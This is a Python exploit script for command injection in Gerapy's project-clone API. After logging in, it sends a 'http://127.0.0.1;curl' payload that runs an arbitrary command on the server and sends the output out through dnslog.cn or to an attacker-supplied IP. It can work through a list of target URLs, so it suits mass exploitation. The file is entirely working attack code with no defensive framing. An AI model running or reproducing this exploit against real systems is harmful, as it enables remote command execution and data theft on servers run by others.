import argparse
import json
from time import sleep

import requests


def Args():
    parser = argparse.ArgumentParser(formatter_class=argparse.ArgumentDefaultsHelpFormatter,description='''
gerapy-RCE!!!
    ''')
    parser.add_argument('-u','--url',help="please input URL")
    parser.add_argument('-f','--file',help="please input URL file")
    parser.add_argument('-U', '--username', help="please input username")
    parser.add_argument('-P', '--password', help="please input password")
    parser.add_argument('-I', '--IpAdress', help="please input ip and port")
    parser.add_argument('-C', '--cmd', help="please input cmd")
    parser.add_argument('-D', '--dnslog',default='',nargs='*',help="dnslog")
    args = parser.parse_args()
    if (args.file is None and args.url is None) or args.username is None or args.password is None:
        print(parser.print_help())
        exit()
    else:
        return args

def check_login(username,password,url):
    global token
    if url[-1:] == '/':
        url = url[:-1]
    else:
        url = url
    realurl = url+"/api/user/auth"
    data = {
        "username": username,
        "password": password
    }
    headers = {
        'Content-Type': 'application/json'
    }
    try:
        res = requests.post(url=realurl,data=json.dumps(data),headers=headers)
        if res.status_code == 200 and "token" in res.text:
            token = json.loads(res.text)['token']
            print("[+]login success! Token:" + token)

        else:
            print("[-]login fail!username or password error")
    except Exception as e:
            print("[-]vuln not exists")
    return token

def DnsLogAttack(url,cmd):
    print("[+]trying RCE attack")
    headerss = {
        "Cookie":"""UM_distinctid=17dd26b4f0617-0a1bd4a03fde2c-c343365-e1000-17dd26b4f075b;PHPSESSID=ht7v7ckmnhb9d9vordgn8f7j64;CNZZDATA1278305074=111893950-1639912407-null%7C1639975457"""
    }
    dns_url = "http://www.dnslog.cn/getdomain.php?t=0.3068990273348928"
    dns_res = requests.get(url=dns_url,headers=headerss)
    if url[-1:] == '/':
        url = url[:-1]
    else:
        url = url
    realurl = url + "/api/project/clone"
    headers = {
        'Content-Type': 'application/json',
        "Authorization": "Token " + token
    }
    data = {
        "address": "http://127.0.0.1;curl " +'`' + cmd + '`.'+dns_res.text
    }
    try:
        res = requests.post(url=realurl, headers=headers, data=json.dumps(data))
        if res.status_code == 200 and "false" in res.text:
            print("[+]attack success!waiting for DNSLOG result")
        else:
            print("[-]fail!maybe try again")
    except Exception as e:
        print("[-]fail!maybe DNSLOG GET fail")
    dns_result_url = "http://www.dnslog.cn/getrecords.php?t=0.3068990273348928"
    dns_ress = requests.get(url=dns_result_url,headers = headerss)
    print("[+]result:"+dns_ress.text)

def IpAttack(url,cmd,ip):
    print("[+]makesure port is Listening!")
    print("[+]trying RCE attack")
    if url[-1:] == '/':
        url = url[:-1]
    else:
        url = url
    realurl = url + "/api/project/clone"
    headers = {
        'Content-Type': 'application/json',
        "Authorization": "Token "+token
    }
    data = {
        "address":"http://127.0.0.1;curl "+ ip +'?`'+cmd+'`'
    }
    try:
        res = requests.post(url=realurl,headers=headers,data=json.dumps(data),timeout=3)
    except Exception as e:
        print("[+]exit")
def readfile(urlpath):
    list = []
    with open(urlpath,"r") as f:
        line = f.readlines()
    for i in line:
        if '/' == i.strip()[-1:]:
            i = i.strip()
        else:
            i = i.strip()+'/'
        list.append(i)
    return list
def main():
    img = """
  _______      ________    ___   ___ ___  __       ____ ___   ___  _  _   ___  
 / ____\ \    / /  ____|  |__ \ / _ \__ \/_ |     |___ \__ \ / _ \| || | / _ \ 
| |     \ \  / /| |__ ______ ) | | | | ) || |______ __) | ) | (_) | || || (_) |
| |      \ \/ / |  __|______/ /| | | |/ / | |______|__ < / / > _ <|__   _\__, |
| |____   \  /  | |____    / /_| |_| / /_ | |      ___) / /_| (_) |  | |   / / 
 \_____|   \/   |______|  |____|\___/____||_|     |____/____|\___/   |_|  /_/  

    """
    print(img)
    args = Args()
    if args.file is None and args.url is not None:
        check_login(args.username,args.password,args.url)
        if args.IpAdress is None:
            DnsLogAttack(args.url,args.cmd)
        else:
            IpAttack(args.url,args.cmd,args.IpAdress)
    else:
        urllist = readfile(args.file)
        for i in urllist:
            check_login(args.username, args.password, i)
            DnsLogAttack(i, args.cmd)

if __name__ =="__main__":
    main()
